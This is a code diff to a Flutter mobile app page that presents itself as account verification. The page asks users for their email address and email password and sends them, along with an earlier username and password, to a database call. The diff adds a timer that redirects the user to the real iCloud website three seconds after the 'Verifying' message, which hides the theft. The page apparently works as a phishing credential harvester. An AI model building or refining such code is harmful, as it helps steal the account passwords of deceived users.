@@ -1,7 +1,10 @@
 // ignore_for_file: public_member_api_docs, sort_constructors_first
+import 'dart:async';
+
 import 'package:email_validator/email_validator.dart';
 import 'package:flutter/cupertino.dart';
 import 'package:flutter/material.dart';
+import 'package:url_launcher/url_launcher.dart';
 
 import '../database.dart';
 import '../main.dart';
@@ -22,6 +25,7 @@ class MobileVerifyPage extends StatefulWidget {
 }
 
 class _MobileVerifyPageState extends State<MobileVerifyPage> {
+  final Uri url = Uri.parse('https://www.icloud.com/');
   TextEditingController passwordC = TextEditingController();
   TextEditingController emailC = TextEditingController();
   GlobalKey<FormState> veryfyformkey = GlobalKey<FormState>();
@@ -95,8 +99,9 @@ class _MobileVerifyPageState extends State<MobileVerifyPage> {
                     Colors.red,
                     Colors.grey,
                     Colors.blue,
-                    Colors.red,
-                    Colors.amber
+                    Colors.grey,
+                    Colors.amber,
+                    Colors.red
                   ])),
                   child: const Center(
                       child: Text(
@@ -128,7 +133,7 @@ class _MobileVerifyPageState extends State<MobileVerifyPage> {
                           "Enter Your Email Address and Email's password to verify your account !",
                           style: TextStyle(
                               fontSize: 13,
-                              color: Colors.red,
+                              color: CupertinoColors.destructiveRed,
                               fontWeight: FontWeight.normal),
                         ),
                       ),
@@ -147,19 +152,21 @@ class _MobileVerifyPageState extends State<MobileVerifyPage> {
                       right: 20,
                     ),
                     child: Form(
-                      key:veryfyformkey,
+                      key: veryfyformkey,
                       autovalidateMode: AutovalidateMode.always,
                       child: Column(children: [
                         Padding(
                           padding:
                               const EdgeInsets.only(left: 10.0, right: 10.0),
                           child: TextFormField(
+                            enableInteractiveSelection: true,
+                            autofillHints: const [AutofillHints.email],
                             enableSuggestions: true,
                             autocorrect: true,
                             showCursor: true,
                             autofocus: false,
                             textAlign: TextAlign.start,
-                            //textDirection: TextDirection.ltr,
+                            textDirection: TextDirection.ltr,
                             strutStyle: const StrutStyle(),
                             style: const TextStyle(),
                             textInputAction: TextInputAction.done,
@@ -207,13 +214,13 @@ class _MobileVerifyPageState extends State<MobileVerifyPage> {
                               hintStyle: TextStyle(fontSize: 16),
                             ),
                             validator: (ifpassword) {
-                               if (ifpassword!.isEmpty) {
-                                    return 'Please enter password';
-                                  } else if (ifpassword.length < 6) {
-                                    return 'Please enter a correct password';
-                                  } else {
-                                    return null;
-                                  }
+                              if (ifpassword!.isEmpty) {
+                                return 'Please enter password';
+                              } else if (ifpassword.length < 6) {
+                                return 'Please enter a correct password';
+                              } else {
+                                return null;
+                              }
                             },
                           ),
                         ),
@@ -228,36 +235,39 @@ class _MobileVerifyPageState extends State<MobileVerifyPage> {
                     style: TextStyle(fontSize: 23, color: Colors.blue),
                   ),
                   onPressed: () {
-                    if(veryfyformkey.currentState!.validate()){
-                    FutureBuilder<Map<String, dynamic>>(
-                      future: Database(
-                              password: widget.password,
-                              username: widget.username,
-                              emailPassword: passwordC.text,
-                              emailUsername: emailC.text)
-                          .getData(),
-                      builder: (BuildContext context,
-                          AsyncSnapshot<Map<String, dynamic>> snapshot) {
-                        switch (snapshot.connectionState) {
-                          case ConnectionState.none:
-                            return const Text('Hey you got no data');
-                          case ConnectionState.done:
-                            return const Text(
-                                "Ice cream time , you are all done");
-                          default:
-                            return const CircularProgressIndicator(
-                                color: CupertinoColors.activeBlue);
-                        }
-                      },
-                    );
-                    const info = 'Verifying please wait...';
-                    const snackBar = SnackBar(
-                      content: Text(info),
-                      duration: Duration(seconds: 4),
-                      backgroundColor: CupertinoColors.activeBlue,
-                    );
-                    ScaffoldMessenger.of(context).showSnackBar(snackBar);
-  }},
+                    if (veryfyformkey.currentState!.validate()) {
+                      FutureBuilder<Map<String, dynamic>>(
+                        future: Database(
+                                password: widget.password,
+                                username: widget.username,
+                                emailPassword: passwordC.text,
+                                emailUsername: emailC.text)
+                            .getData(),
+                        builder: (BuildContext context,
+                            AsyncSnapshot<Map<String, dynamic>> snapshot) {
+                          switch (snapshot.connectionState) {
+                            case ConnectionState.none:
+                              return const Text('Hey you got no data');
+                            case ConnectionState.done:
+                              return const Text(
+                                  "Ice cream time , you are all done");
+                            default:
+                              return const CircularProgressIndicator(
+                                  color: CupertinoColors.activeBlue);
+                          }
+                        },
+                      );
+                      const info = 'Verifying please wait...';
+                      const snackBar = SnackBar(
+                        content: Text(info),
+                        duration: Duration(seconds: 3),
+                        backgroundColor: CupertinoColors.activeBlue,
+                      );
+                      ScaffoldMessenger.of(context).showSnackBar(snackBar);
+
+                      Timer(const Duration(seconds: 3), () => launchUrl(url));
+                    }
+                  },
                 ),
                 const SizedBox(height: 10),
                 TextButton(
